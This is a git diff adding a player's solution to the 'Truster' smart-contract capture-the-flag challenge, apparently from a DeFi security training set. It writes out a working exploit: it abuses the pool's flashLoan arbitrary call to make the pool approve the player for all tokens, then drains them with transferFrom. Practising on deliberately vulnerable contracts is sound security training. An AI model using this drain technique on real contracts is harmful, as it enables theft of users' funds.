@@ -23,6 +23,29 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // attacker_contract = await (await ethers.getContractFactory("TrusterAttacker", player)).deploy(token.address, player.address);
+        // const functionSignature = attacker_contract.interface.getSighash("attack");
+        // await pool.flashLoan(0, attacker_contract.address, attacker_contract.address, functionSignature);
+        // attacker_contract.on("MyEvent", (from, value, event) => {
+        //     console.log(`Event emitted by: ${from} with value: ${value.toString()}`);
+        // });
+
+
+        // I'm not sure why my original solution does not work, but I understand
+        // why this one does, and that's good enough for now.
+        let ABI = ["function approve(address to, uint256 amount)"];
+        let iface = new ethers.utils.Interface(ABI);
+        const data = iface.encodeFunctionData("approve", [
+          player.address,
+          TOKENS_IN_POOL,
+        ]);
+        await pool.flashLoan(0, player.address, token.address, data);
+
+
+        console.log("Allowance:", await token.allowance(pool.address, player.address));
+        console.log("balance: ", await token.balanceOf(pool.address));
+
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
